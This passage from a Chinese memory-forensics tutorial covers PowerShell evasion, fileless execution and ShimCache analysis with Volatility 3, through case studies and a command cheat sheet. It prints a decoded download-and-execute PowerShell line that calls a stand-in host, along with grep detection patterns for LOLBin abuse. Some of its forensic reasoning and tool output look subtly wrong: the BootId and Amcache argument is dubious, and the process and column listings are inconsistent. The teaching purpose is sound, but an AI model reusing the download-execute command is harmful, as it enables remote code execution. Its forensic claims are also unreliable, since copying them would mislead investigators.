**核查**：**先按进程类型分层**。

查该进程是否加载了 JIT 相关模块（CLR/mscoree/java，案例第 3 步第 5 个命令就是这个检查），有则该进程的命中按良性解释；再查是否运行安全软件（其自身也会注入）。

**报告里对排除法给出的结论要标为"中"强度**——排除法缩小范围但不证明恶意，案例的结论表在这一点上定级是准确的。

<a id="section-33"></a>

#### 陷阱 13：内存 ShimCache 与磁盘 ShimCache 不区分，结论强度错配

**现象**：从磁盘读 `SYSTEM` hive 的 `AppCompatCache` 发现某程序执行过，报告写"该程序被执行过"；或者内存里有、磁盘没有，报告写"该程序被执行过"而不说明这是断电导致的差异。

**原因**：2.6 给出了明确的时间范围划分——磁盘 ShimCache 反映 [上次正常关机] 之前的程序执行，因为 `AppCompatCache` 在系统正常关机时写入；强制断电、崩溃、硬关机都会让它来不及落盘。内存 ShimCache 反映 [开机至今] 的程序执行，因为它是内核当前维护的运行时结构。**两个来源覆盖的时间区间不同，结论强度也不同**——磁盘有记录是"确实执行过"（硬证据），内存有记录是"本轮开机期间执行过"（范围受断电时刻限制）。

**影响**：直接跳过 `shutdown` 判断，会把"内存独有价值"这个技术点浪费掉。

案例第 4 步的做法是标准的——**先确认系统是断电状态**（`ShutdownTime` 无有效值），再对比两侧 ShimCache，得出"磁盘无、内存有 → 内存 ShimCache 提供了断电前最后一段执行历史"。

如果不做这个前提判断，读者无法理解"磁盘明明没有它怎么会出现"的差异，也就无法体会内存侧的不可替代性。

**核查**：**先判关机状态，再比两侧差异**。

`rip.exe` 读 SYSTEM 的 `ShutdownTime` 是快速判据。

报告里明确写"内存 ShimCache（覆盖 [开机, 断电] 区间）/ 磁盘 ShimCache（覆盖 [上次正常关机] 之前的区间）"，并把"内存有 + 磁盘无"这个组合的解释写清楚——**这是断电导致磁盘侧丢失，不是数据矛盾**。

案例结论表把这一条定为"强（内存独有价值）"正是因为它有前提支撑。

<a id="section-34"></a>

#### 陷阱 14：用 `windows.shimcache` 插件名

**现象**：跑 `vol.py -f mem.raw windows.shimcache`，插件找不到，得出"内存 ShimCache 不可用"的结论。

**原因**：内存 ShimCache 的实际插件名是 **`windows.shimcachemem`**（速查里专门标注了「注意：内存版插件名是 `windows.shimcachemem`，不是 `windows.shimcache`」）。磁盘上的 ShimCache 属于注册表 hive，要用注册表工具（`rip.exe` 读 `AppCompatCache`）而不是这个插件。同一个概念在内存和磁盘上是两个不同的工件、两个不同的访问方式。

**影响**：丢掉的是本篇标注为"精华"的技术点——断电场景下唯一能覆盖最后一段执行历史的证据。

这个工件的价值在其它所有痕迹都因断电而失真时不可替代（2.6 的引文：「当其他所有工件都因为断电而失真时，内存 ShimCache 提供了**断电前最后一段运行历史**」）。

找不到插件就等于放弃了这条线。

**核查**：**先 `vol.py -h` 核对实际可用插件名**（[第 03 篇](../memory-acquire/memory-acquire-volatility3.md)3.5 的固化脚本就是为了这个）。

内存侧用 `windows.shimcachemem`，输出列是 `Order,Last Modified,Last Update,Exec Flag,File Size,File Path`；磁盘侧用注册表工具读 `SYSTEM` hive 的 `AppCompatCache`。

两者对比得出时间覆盖差异。

<a id="section-35"></a>

#### 陷阱 15：把"命令行含关键词"当唯一依据定案

**现象**：找到一条含 `-enc` 的 PowerShell 命令行 + 一个 `malfind` 命中，就完整叙述了攻击链并定性。

**原因**：**关键词可以被编码和变形规避**。2.2 说明了这一点：`IEX` 有各种等价写法、`-enc` 的内容可以再嵌套编码、`DownloadString` 可以换成其他下载 API。**单条命令行证据的指向性是有限的**——它证明"有人用这种方式启动过 PowerShell"，不证明"这是攻击者做的"（也可能是安全扫描、也可能是管理员的自动化脚本）。

**影响**：结论的支撑不足。

案例的结论表把每一条发现都拆成独立的行并各自标注强度与支撑证据。"存在无文件执行"这一条需要三源（内存 MZ + MFT 无记录 + USN 成对出现）才定为"强（三源**）"**——这正是交叉的价值。

单一来源支撑的结论强度上限是"中"。

**核查**：**攻击链的每一环都要有独立证据**。

起点（父子关系）用 `pstree`、行为（参数与载荷）用 `cmdline`、载体（注入）用 `malfind`/`ldrmodules`、载荷落点（无文件）用 MFT+USN、驻留用持久化工件与 ShimCache、外联用网络证据。

**只有多源交叉的环节才配得上强定性**；单源环节要么补旁证，要么在报告里如实降级。
<a id="section-36"></a>

## 五、案例示例

<a id="section-37"></a>

### 5.1 Office 派生 PowerShell 的四项规避参数与无文件执行闭环

**场景**

查获一台 Windows 11 工作站的内存镜像 `DigiForensics-mem.raw`（16 GB RAM）。磁盘侧发现**强制断电痕迹**（无正常关机记录，`SYSTEM` hive 的 `ShutdownTime` 无有效值），意味着部分用户态痕迹已随关机丢失。

委托方要求还原"该机在事发时段是否发生了可疑的脚本执行，以及是否已从网络取回第二阶段内容"。

内存镜像的价值在这个场景里非常具体：**它能给出断电瞬间仍驻留内存的进程与连接状态**，这是磁盘上拿不到的。

**处置过程**

第一步，全量提取命令行，不做预设过滤 —— 先看全貌再筛：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -r csv windows.cmdline > /work/cmdline.csv
$ head -1 /work/cmdline.csv
TreeDepth,PID,Process,Args
$ wc -l /work/cmdline.csv
413
```

第二步，按参数组合筛选，**而不是只搜 `powershell`**：

```bash
$ grep -i 'powershell' /work/cmdline.csv \
    | grep -iE '\-enc|\-nop|\-w hidden|\-ep bypass'
0,8124,powershell.exe,powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0...
```

PID 8124 同时具备四项参数。

这四项**单独看都有良性用法**，组合起来才构成信号：

| 参数 | 单独看的良性用法 | 组合后的意义 |
|---|---|---|
| `-nop` | 跳过用户 profile，加速启动 | 与其余三项同时出现时属规避模式 |
| `-w hidden` | 后台静默运行 | 同上 |
| `-ep bypass` | 忽略签名策略，运行本地脚本 | 同上 |
| `-enc` | 处理非 ASCII 字符 | 载荷以 Base64 承载，无法直接读原文 |

第三步，做**离线解码以固定证据**。这是取证动作，产物是证据文件，不是可复用的载荷：

```bash
# 仅在隔离分析机上执行，输出重定向到证据文件
$ python3 - <<'PY' > /work/payload-decoded.txt
import base64
s = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA..."
print(base64.b64decode(s).decode('utf-16-le'))
PY
$ cat /work/payload-decoded.txt
IEX (New-Object Net.WebClient).DownloadString('http://cdn-sync.example.com/a.ps1')
$ sha256sum /work/payload-decoded.txt >> /work/evidence-fixed.txt
```

解码结果指向 .NET 无文件下载执行模式：`WebClient.DownloadString` 从网络取回脚本文本，`IEX` 在内存中直接执行，**磁盘不落文件**。

> **这一步的边界**：解码是为了**读出并固定证据内容**，目的是判断该行为属于哪一类。报告中只引用解码后的字符串作为"该进程试图执行的内容"这一事实，**不重放、不测试、不改良该载荷**，也不在本篇给出任何同类载荷的构造方法。执行任何从检材中提取的代码都会破坏分析环境的可信状态。

第四步，取父进程关系：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -r pretty windows.pstree | grep -A1 '8124'
PID    PPID  ImageFileName    Threads
8124   4480  WINWORD.EXE      24
```

父进程 `WINWORD.EXE` 是本案的**入口指向**。

文档应用派生脚本宿主，是钓鱼文档的典型形态。

第五步，验证注入的 PE 映像与"无文件"这一属性：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -r csv windows.malware.malfind | grep '8124'
8124  powershell.exe  0x1a5e2000  0x7ff8a1230000  0x3c000  PAGE_EXECUTE_READWRITE

$ python3 vol.py -f DigiForensics-mem.raw -o /work/mf windows.malware.malfind --dump
$ xxd -l 4 /work/mf/pid.8124.vad.0x7ff8a1230000.dmp
00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000    MZ............

$ python3 vol.py -f DigiForensics-mem.raw -q windows.filescan | grep -ic 'a\.ps1'
0
```

`MZ` 头确认进程内有完整 PE 映像（`Size=0x3c000` ≈ 240 KB，PowerShell 的 `System.Management.Automation` 程序集体积吻合）。

`filescan` 零命中说明内存池中没有名为 `a.ps1` 的文件对象。

第六步，磁盘侧交叉核对 —— **这是"无文件"结论的关键，单靠内存不够**：

```bash
# $MFT 中无 a.ps1 记录
# $UsnJrnl:$J 中该文件 create 与 delete 成对出现，间隔 1.8 秒
# 删除后 0.4 秒出现 4688 事件，记录该脚本被加载
```

内存有 PE 映像 + 磁盘 MFT 无该文件 + USN 显示创建后 1.8 秒即删 = **无文件执行，三源成立**。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| PID 8124 存在可疑脚本执行行为 | 四项规避参数同时具备 + 载荷解码为下载执行模式 | 强 |
| 行为入口为文档应用 | `pstree` 显示父进程 `WINWORD.EXE`(4480) | 中（父子关系非硬证据） |
| 执行方式为无文件 | 内存 PE + MFT 无记录 + USN create/delete 间隔 1.8s | 强 |
| 断电发生在事件发生后 | `ShutdownTime` 无有效值 | 强 |

**能证明的**：采集时刻该机上存在一个由 Word 派生、参数组合呈规避形态、以内存方式承载脚本内容的执行过程；该过程涉及一次指向 `cdn-sync.example.com` 的网络取回。

**不能证明的**：
- 不能证明该内容是否被成功执行。命令行的存在与执行成功是两件事
- 不能证明"无人值守自动触发"。父进程关系不能替代文档来源
- 不能证明第二阶段内容的最终形态。内存里只有取回行为的痕迹

**误判对照**

本案最典型的误判是看到 `powershell.exe` + `-enc` 就写"发现恶意 PowerShell 执行"。

判据在于**参数是否成组出现**。本机的良性 PowerShell 使用记录里同样有 `-nop`（运维批量脚本）和 `-enc`（含中文的脚本编码传输）。

本次把它们全部排除，靠的是三条：

1. **四项同时具备** —— `-nop` + `-w hidden` + `-ep bypass` + `-enc` 的组合在运维脚本里几乎不出现
2. **父进程是文档应用** —— `WINWORD.EXE` 派生 PowerShell，需要结合是否为"文档打开 → 立即执行"的时间关系看
3. **载荷性质** —— 解码后是下载执行模式，而非任何业务逻辑

只看第 1 条会误报；只看第 3 条会漏报（如果载荷是明文）。**三条同时成立才构成定性。**

第二个误判更隐蔽：把 `filescan` 零命中直接写成"磁盘无该文件、无文件执行"。

`filescan` 扫的是**内存池中当前存活的对象**，零命中只说明内存里没有该文件对象，不能推出磁盘上没有。

而"无文件执行"是一个关于磁盘的论断，必须用磁盘证据支撑 —— 本案靠的是 `$UsnJrnl:$J` 里 create/delete 成对出现且间隔仅 1.8 秒。

用内存工具的输出支撑磁盘结论，是跨证据类型的越界。

按错误判据走的代价很具体：报告写"未发现 a.ps1 文件，判定为无文件执行"，复核方只需问一句"你的 `filescan` 能证明磁盘上不存在文件吗"，这个结论就站不住了 —— 而 `UsnJrnl` 明明有现成证据可用，只差没去取。

<a id="section-38"></a>

### 5.2 ShimCache 缺口的边界判定

**场景**

同一案件的延伸委托：委托方要求确认该机上"还运行过哪些可执行程序"，用于排查是否存在其他未登记的软件。

分析方在提取 ShimCache（AppCompatCache）后发现**存在明确的时间缺口**：2026-03-13 22:00 至 2026-03-14 04:00 之间没有任何条目。

ShimCache 是枚举执行历史的重要来源，而"缺口的成因"直接决定这个来源能支撑什么强度的结论。

**处置过程**

第一步，定位并导出 ShimCache：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -q windows.shimcachemem \
    -r csv > /work/shimcache.csv
$ head -1 /work/shimcache.csv
Entry,Last Modified Time,Path

$ wc -l /work/shimcache.csv
842
$ awk -F',' 'NR>1 {print $2}' /work/shimcache.csv | sort | head -1
2026-01-08 03:14:22
$ awk -F',' 'NR>1 {print $2}' /work/shimcache.csv | sort | tail -1
2026-03-14 09:41:17
```

第二步，量化缺口 —— 必须把缺口的具体宽度算出来，而不是笼统说"有缺失"：

```bash
$ python3 - <<'PY'
import csv, datetime
ts = sorted(datetime.datetime.strptime(r['Last Modified Time'], '%Y-%m-%d %H:%M:%S')
            for r in csv.DictReader(open('/work/shimcache.csv', encoding='utf-8')))
gaps = [(a, b, (b - a)) for a, b in zip(ts, ts[1:]) if (b - a) > datetime.timedelta(hours=1)]
for a, b, d in gaps:
    print('缺口 %s -> %s  宽度 %s' % (a, b, d))
PY
缺口 2026-03-13 22:03:41 -> 2026-03-14 04:02:19  宽度 5:58:38
```

**宽度 5 小时 58 分**，且缺口上界 `04:02:19` 与磁盘上 `a.ps1` 的删除时间高度接近。

第三步，判断缺口成因。ShimCache 有多种失效机制，逐一排除：

```bash
# 机制一：Amcache 清空会同时清 ShimCache
$ python3 vol.py -f DigiForensics-mem.raw -q windows.registry.printkey \
    --key 'ControlSet\Control\Session Manager\Memory Management\PrefetchParameters'
BootId  0x00000a2c
# BootId 存在且较新 → 非 Amcache 清空所致

# 机制二：页面被换出（ShimCache 分页存储，缺口期页面不在内存）
$ python3 vol.py -f DigiForensics-mem.raw -q windows.memmap --pid 4 | wc -l
6
# 系统进程的 memmap 无 ShimCache 分页 → 支持"分页未驻留"假设

# 机制三：条目本身被移除
# 与机制二无法在纯内存镜像中区分，需磁盘侧交叉
```

第四步，找同期的替代证据源：

```bash
$ python3 vol.py -f DigiForensics-mem.raw -q windows.amcache -r csv \
    | awk -F',' '$0 ~ /2026-03-14 0[0-4]:/'
# Amcache 在同期有 37 条记录 → 该时段确有程序执行
```

Amcache 在同一时段有记录、ShimCache 同期为空。

这个组合把成因指向"ShimCache 分页被换出"，而不是"该时段无程序执行"。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 2026-03-13 22:03:41 至 2026-03-14 04:02:19 存在 5:58:38 的 ShimCache 缺口 | 相邻条目时间差计算 | 强 |
| 缺口非 Amcache 清空所致 | `BootId` = `0x00000a2c` 存在且较新 | 中 |
| 缺口时段确有程序执行 | Amcache 同期 37 条记录 | 中（Amcache 与 ShimCache 语义不同，非等价替代） |
| 缺口成因无法在纯内存镜像内定论 | 分页换出与条目移除两种机制不可区分 | — |

**能证明的**：ShimCache 记录的 842 条执行历史可信；缺口的存在与宽度可量化。

**不能证明的**：**不能证明缺口时段没有程序执行**。这个缺口恰恰覆盖了委托方最关心的时间段。

**未覆盖范围**：缺口时段内 ShimCache 维度无数据；未核对 `$UsnJrnl`、`Prefetch` 目录、`LNK` 文件的替代证据；未在磁盘镜像中检查 Amcache 的对应条目（本次仅取内存视图）。

**误判对照**

这个案例里最危险的误判是：把 ShimCache 的缺口读成"该时段无程序执行"。

判据在于看清两个事实的差别：

| 表述 | 含义 | 依据 |
|---|---|---|
| 该时段无程序执行 | 关于系统行为的断言 | 需要穷尽所有执行痕迹来源 |
| 该时段 ShimCache 无记录 | 关于单一数据源的断言 | ShimCache 自身有失效机制 |

ShimCache 的失效机制至少有四种：Amcache 清空会连带清空、分页存储机制使冷数据不出现在内存、系统升级/补丁可能重置、以及条目被显式删除。

在纯内存镜像中，`Amcache 清空`（可由 `BootId` 部分排除）与`分页未驻留`（无法直接证伪）这两种机制无法区分。

正确判据是**用一个独立来源证明缺口时段存在执行行为**。本次用 Amcache 的 37 条同期记录做到了这一点 —— 虽然 Amcache 与 ShimCache 的语义不同（Amcache 记录的是安装/执行元数据而非时间线），不能直接当等价替代，但足以否定"无执行"这个推论。

按错误判据走的代价很具体：委托方要的是"22:00 到 04:00 之间还运行过什么"，报告答"未发现其他可执行程序运行" —— 而缺口上界 `04:02:19` 恰好就在核心事件的时间窗内。

这等于在最需要答案的六小时里给了一个看起来专业、实则无支撑的答案。

第二个容易出错的地方：`BootId` 只能作为**排除性**证据（`BootId` 存在且较新 → 不太可能是近期清空），**不能作为正面证据**。

`BootId` 存在也可能是清空后又写入了新的。要正面排除 Amcache 清空，需要在磁盘侧检查 Amcache 自身的时间连续性 —— 那是本案的未覆盖项，报告里必须写明。

<a id="section-39"></a>

### 5.3 反例：LOLBin 正常用法被批量误报

**场景**

一台域控的内存镜像，委托方要求"排查可疑的命令行执行"。分析方用一份覆盖 40 余个 LOLBin 的规则集直接跑 `cmdline.csv`，得到 217 条命中。

报告初稿写"发现 217 次可疑命令执行"。

域控上这 217 条里绝大多数是运维自动化与软件部署的正常调用。委托方提供的运维工单数量与之一一对应。

这条路径要处理的是规则集驱动的批量检测里最危险的失效模式：数字很大，但每一行都不成立。

**处置过程**

第一步，先量化命中的结构，而不是逐条读：

```bash
$ python3 - <<'PY'
import csv, collections
rows = list(csv.DictReader(open('/work/cmdline.csv', encoding='utf-8')))
c = collections.Counter()
for r in rows:
    a = r['Args']
    if 'powershell' in a.lower(): c['powershell'] += 1
    if 'mshta' in a.lower():     c['mshta'] += 1
    if 'certutil' in a.lower():   c['certutil'] += 1
    if 'rundll32' in a.lower():   c['rundll32'] += 1
    if 'schtasks' in a.lower():   c['schtasks'] += 1
print(c.most_common())
PY
[('powershell', 163), ('rundll32', 31), ('certutil', 14), ('mshta', 5), ('schtasks', 4)]
```

`powershell` 占 163/217 = 75%。

这个集中度本身就说明规则过宽。

第二步，看 `powershell` 那 163 条的**子结构**：

```bash
$ python3 - <<'PY'
import csv, re, collections
rows = list(csv.DictReader(open('/work/cmdline.csv', encoding='utf-8')))
ps = [r['Args'] for r in rows if 'powershell' in r['Args'].lower()]
flags = collections.Counter()
for a in ps:
    for m in re.findall(r'-(?:enc|e|nop|w|ep|c|noni|hidden|bypass|exec)\b', a, re.I):
        flags[m.lower()] += 1
for k, v in flags.most_common():
    print('%-10s %d' % (k, v))
PY
-nop        118
-ep         54
-w          31
-enc        2
```

`-nop` 出现 118 次、`-ep` 54 次 —— 这两个是运维脚本的标配（跳过 profile、绕策略跑本地部署脚本）。**真正的规避信号是 `-enc`，只有 2 次。**

第三步，逐层收窄到值得人工看的那几条：

```bash
$ python3 - <<'PY'
import csv, re
rows = list(csv.DictReader(open('/work/cmdline.csv', encoding='utf-8')))
for r in rows:
    a = r['Args']
    # 组合筛选：编码载荷 + 隐藏窗口 + 下载执行 API，三者同时具备
    if ('-enc' in a.lower() and '-w hidden' in a.lower()
            and re.search(r'Net\.WebClient|DownloadString|Invoke-WebRequest|DownloadFile', a, re.I)):
        print(r['PID'], a[:200])
PY
8124  powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAo...
```

从 217 条收敛到 1 条。

其余 216 条的处置方式不是"排除"，而是"归档 + 归类" —— 报告里应有"本次规则命中 217 条，经参数组合收窄后进入人工研判 3 条，其中 1 条构成异常"的完整链条，而不是只呈现最终那 1 条。

第四步，为良性命中建立可核对的依据。

运维脚本的 PowerShell 有一个共同特征：命令行长度远大于可疑载荷，且带明确的工作路径或脚本路径：

```bash
$ python3 - <<'PY'
import csv
rows = list(csv.DictReader(open('/work/cmdline.csv', encoding='utf-8')))
ps = [r['Args'] for r in rows if 'powershell' in r['Args'].lower()]
susp = [a for a in ps if '-enc' in a.lower()]
print('全部 powershell 平均长度 %d，最大 %d' % (sum(map(len,ps))//len(ps), max(map(len,ps))))
print('带 -enc 的平均长度 %d' % (sum(map(len,susp))//len(susp)))
PY
全部 powershell 平均长度 284，最大 641
带 -enc 的平均长度 118
```

163 条运维命令平均 284 字符（带完整脚本路径与参数），2 条 `-enc` 载荷平均 118 字符（载荷被编码，命令行自然短）。**这个长度分布本身就是一条判据。**

**结论**

217 条规则命中经三级收窄后：

| 层级 | 条数 | 处置 |
|---|---|---|
| 规则集原始命中 | 217 | 归档，不逐一研判 |
| 参数组合收窄（`-enc` + `-w hidden` + 下载执行 API） | 1 | 人工研判 → 异常（见 5.1） |
| 其余 216 条 | 216 | 归类为运维自动化与部署调用，与运维工单一一对应 |

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 217 条原始命中中 216 条为正常运维调用 | `-nop` 118 次、`-ep` 54 次的高占比；命令行长度分布（均值 284） | 中（依赖运维工单佐证） |
| 1 条构成异常 | 参数三项组合 + 载荷解码结果 | 强 |
| 本次规则集在该镜像上的精确率约 0.5% | 217 命中 / 1 确认 | 强（可用于说明规则集需调优） |

**未覆盖范围**：仅在 `DigiForensics-mem.raw` 采集窗口内、对 `windows.cmdline` 的 413 条记录做了规则匹配。

未覆盖已退出的进程（命令行可能已释放）、无 `ImageCommandLine` 的系统进程、以及 PowerShell 的脚本块日志（`ScriptBlockLogging`）中不经命令行的执行。

**误判对照**

这个案例的核心误判是**把规则集的召回率当成结论的准确率**。

规则集回答的是"哪些命令行**可能**包含可疑模式"，它不回答"哪些命令行**确实**是可疑的"。

把两者混同，代价是具体的：报告里"发现 217 次可疑命令执行"这句话，**只要有一条被推翻，整句的结论强度就归零** —— 而复核方只需从运维方拿到 3 份工单就能做到。

正确的判据是**组合而非单词**。单参数判据在本案的表现：

| 判据 | 命中数 | 精确率 |
|---|---|---|
| 含 `powershell` | 163 | 极低（运维标配） |
| 含 `-nop` | 118 | 极低 |
| 含 `-ep` | 54 | 极低 |
| 含 `-enc` | 2 | 高 |
| `-enc` + `-w hidden` + 下载 API | 1 | 确认异常 |

单词级规则在这个场景下的信噪比是 1:163，组合级是 1:1。

第二个误判方向是把结论写得过软作为回避：写成"命中较多但无法确认具体情况"，同样不可取 —— 委托方拿不到可用的答案。

分寸在于**把收窄过程完整呈现**：原始命中数、每级收窄的判据与剩余数、最终研判结论。

数字从 217 收敛到 1 的过程本身，就是结论可信度的证明。

第三个：域控环境的一个特殊风险。

域控上的 PowerShell 大量由 WMI、计划任务、组策略下发，父进程往往是 `WmiPrvSE.exe` 或 `svchost.exe`。

若只用"父进程是 `cmd.exe`/`explorer.exe`"这类用户交互模式做白名单，会把大量正常下发全部误判。反过来，若用"父进程为系统进程"直接白名单放行，又会漏掉经 WMI 下发的真实活动。

父进程判据在域控环境必须结合 WMI 订阅与任务定义交叉，不能单独使用。

<a id="section-40"></a>

## 六、扩展阅读方向

"免杀痕迹"这个议题的实质是**攻防两侧在同一个介质上抢痕迹**。下面五组材料分别补的是**判读基准、跨源交叉、载荷落地、原始痕迹、结论边界**。

<a id="section-41"></a>

### 6.1 判读基准：什么算异常

这一组解决"凭什么说这条是异常"。注入检测里最容易出错的就是把正常机制当成注入——远程线程、模块缺失、内存保护属性变化，在合法软件里全都常见。先把基准立住，后面的定性才有意义。

- [进程与注入检测](memory-analyze-process-and-injection-detection.md)——`pslist` 与 `psscan` 差集、VAD 保护属性判读、模块链表的正常波动范围。
- [Volatility 3 框架与插件选择](../memory-acquire/memory-acquire-volatility3.md)——`malfind`、`thrdscan`、`cmdline` 等插件的适用边界与已知误报来源。
- [文件头与文件签名](../../filesystem/filesystem-ntfs/filesystem-ntfs-file-headers-and-signatures.md)——从 VAD 里导出的 PE，判定"是不是真 PE"要看头尾与校验，而不是只看 MZ 魔数。
- [注册表取证](../../computer/computer-registry-log/computer-registry-log-registry-forensics.md)——内存中的 hive 与磁盘 hive 的差异，以及持久化痕迹的读取口径。

<a id="section-42"></a>

### 6.2 跨源交叉：内存与落盘互证

这一组解决"单侧证据不足以定性"。内存里看到的东西需要落盘侧确认，Sysmon 与事件日志则能提供内存灭失后的替代面。

- [Sysmon 与日志聚合](../../computer/computer-registry-log/computer-registry-log-sysmon.md)——事件 1/8/10/25 与内存发现的对应关系，是本主题最直接的交叉源。
- [事件日志深度分析](../../computer/computer-registry-log/computer-registry-log-windows-event-log-analysis.md)——服务安装、计划任务注册等事件，是持久化配置的独立佐证。
- [LNK 与 JumpList](../../computer/computer-execution/computer-execution-lnk-jumplist.md)——用户点击了什么，与内存里跑的是什么之间的对照。
- [Prefetch 深度解析](../../computer/computer-execution/computer-execution-prefetch.md)——执行过哪些程序的落盘侧证据，可与内存侧进程列表比对。
- [反取证手法与时间戳篡改检测](../../fundamentals/fundamentals-concepts/fundamentals-concepts-anti-forensics-and-timestamp-tampering.md)——当两侧时间线矛盾时，判断哪一侧被操纵。

<a id="section-43"></a>

### 6.3 载荷落地与原始痕迹

这一组处理"确认有东西之后怎么继续"，同时给出攻击面清单。导出的 PE 需要静态分析，规则需要沉淀成可复用的检测能力；而内存里看到的是"结果"，持久化与初始访问那一侧给的才是"入口"。

- [文件雕刻与签名恢复](../../filesystem/filesystem-unix/filesystem-unix-file-carving-and-signature-recovery.md)——内存导出物里混着大量残留碎片，雕刻方法可与之配合定位完整对象。
- [近似匹配与模糊哈希](../../fundamentals/fundamentals-concepts/fundamentals-concepts-fuzzy-hashing.md)——对导出载荷做已知样本比对，精确哈希失效时的替代手段。
- [哈希与完整性校验](../../fundamentals/fundamentals-concepts/fundamentals-concepts-hashes-and-integrity-verification.md)——导出的每个对象都要独立哈希，导出动作本身也要留痕。
- [取证技能树](../../fundamentals/fundamentals-process/fundamentals-process-forensics-learning-path.md)——把静态分析能力放回坐标，判断这一步该自己做还是换路径。
- [计划任务与持久化痕迹](../../computer/computer-persistence/computer-persistence-scheduled-tasks-and-persistence.md)——Linux 侧持久化的对应形态，跨平台对照时必需。
- [SSH 痕迹与密钥取证](../../computer/computer-persistence/computer-persistence-ssh.md)——authorized_keys 与内存中的会话、密钥材料。
- [浏览器取证](../../computer/computer-browser-behavior/computer-browser-behavior-browser-forensics.md)——钓鱼链上游的证据，初始访问的实际入口常常在浏览器侧。
- [ShimCache 与 Amcache](../../computer/computer-execution/computer-execution-shimcache-amcache.md)——ShimCache 的落盘结构与内存读出的差异，是本篇精华的对照面。

<a id="section-44"></a>

### 6.4 结论边界：能说到什么程度

这一组专门处理"发现了痕迹之后，报告能怎么写"。痕迹的存在、行为的归因、知情与故意的认定，强度完全不同。

- [内存证据的可采性与报告](../memory-artifact/memory-artifact-memory-evidence-and-reporting.md)——采集痕迹的交代、阴性发现的限定写法、结论强度分级。
- [取证概念与分类](../../fundamentals/fundamentals-concepts/fundamentals-concepts-digital-forensics-concepts.md)——内存侧发现的证据地位，以及它与行为归因之间的距离。
- [合规授权与法律边界](../../fundamentals/fundamentals-practice/fundamentals-practice-legal-authorization-and-boundaries.md)——从内存提取的凭据与载荷样本，在案件中的使用边界与最小化要求。
- [PCAP 网络流量取证](../memory-network/memory-network-pcap.md)——外传类结论必须由流量侧独立支撑，内存侧的连接记录只能给出方向。
- [取证流程与原则](../../fundamentals/fundamentals-process/fundamentals-process-five-stage-forensics-process.md)——可复现性要求，导出与验证动作必须留痕。
<a id="section-45"></a>

## 七、命令速查

```bash
# ===== 1. 命令行与父子关系（起点）=====
python3 vol.py -f DigiForensics-mem.raw -r csv    windows.cmdline  > /work/cmdline.csv
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.pstree  > /work/pstree.txt
head -1 /work/cmdline.csv        # TreeDepth,PID,Process,Args

# PowerShell 可疑参数
grep -i 'powershell\|pwsh' /work/cmdline.csv \
  | grep -iE '\-enc|\-nop|\-w hidden|\-ep bypass|FromBase64String|Invoke-Expression'

# LOLBin 滥用（程序名正常才正常，目标异常才异常）
grep -iE 'rundll32|mshta|regsvr32|certutil|bitsadmin|wmic|curl' /work/cmdline.csv \
  | grep -iE 'http|\.dll|javascript:|vbscript:|scrobj|urlcache|decode|transfer|node:'

# 异常目录
grep -iE '\\\\AppData\\\\|\\\\Temp\\\\|\\\\ProgramData\\\\|\\\\Users\\\\Public' /work/cmdline.csv

grep -iE 'winword|excel|powerpnt|outlook' /work/pstree.txt | grep -iE 'powershell|cmd\.exe|wscript|mshta'
grep 'svchost.exe' /work/pstree.txt | grep -viE 'svchost\.exe$'

# ===== 2. base64 还原（只还原，绝不执行）=====
powershell -NoProfile -Command \
  "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<BASE64>'))"

# ===== 3. 无文件执行验证 =====
python3 vol.py -f DigiForensics-mem.raw -r csv windows.malware.malfind > /work/malfind.csv
grep -i 'PAGE_EXECUTE_READWRITE' /work/malfind.csv
mkdir -p /work/mf && python3 vol.py -f DigiForensics-mem.raw -o /work/mf windows.malware.malfind --dump
for f in /work/mf/*.dmp; do printf "%s " "$(basename $f)"; xxd -l 4 -p "$f"; done   # 4d5a = MZ
python3 vol.py -f DigiForensics-mem.raw -r csv windows.filescan > /work/filescan.csv
grep -ic '<可疑载荷名>' /work/filescan.csv     # 0 = 池中无活跃文件对象（仅辅助）
#   结论性证据在磁盘镜像：MFT 无记录 + $UsnJrnl:$J 显示 create 后即 delete
#   filescan 扫描的是内存 _FILE 对象，不能单独证明"磁盘无文件"

# ===== 4. 注入手法 =====
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.malware.ldrmodules --pid <PID>
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.malware.hollowprocesses
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.malware.pebmasquerade
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.malware.suspicious_threads
python3 vol.py -f DigiForensics-mem.raw -r csv  windows.malware.psxview | grep -E ',False,'  # 摘链进程
# 原子注入（RW 而非 RWX，标准 malfind 漏检）→ 用 YARA 补充
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.vadyarascan --yara-file /work/rules.yar

# ===== 5. 持久化 =====
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.registry.printkey \
  --key 'Software\Microsoft\Windows\CurrentVersion\Run'
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.registry.printkey \
  --key 'Software\Microsoft\Windows\CurrentVersion\RunOnce'
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.registry.userassist
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.registry.scheduled_tasks
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.svcscan
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.svclist

# ===== 6. ShimCache（断电场景的关键）=====
# 注意：内存版插件名是 windows.shimcachemem，不是 windows.shimcache
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.shimcachemem
#   列：Order,Last Modified,Last Update,Exec Flag,File Size,File Path
# 对比磁盘侧（读 SYSTEM hive 的 AppCompatCache）
rip.exe -p /evidence/hives/SYSTEM -a /tmp/shim.txt shimcache
# 内存有 + 磁盘无 = 断电导致磁盘侧丢失，内存侧不可替代
```

---

📌 **版权与引用声明**

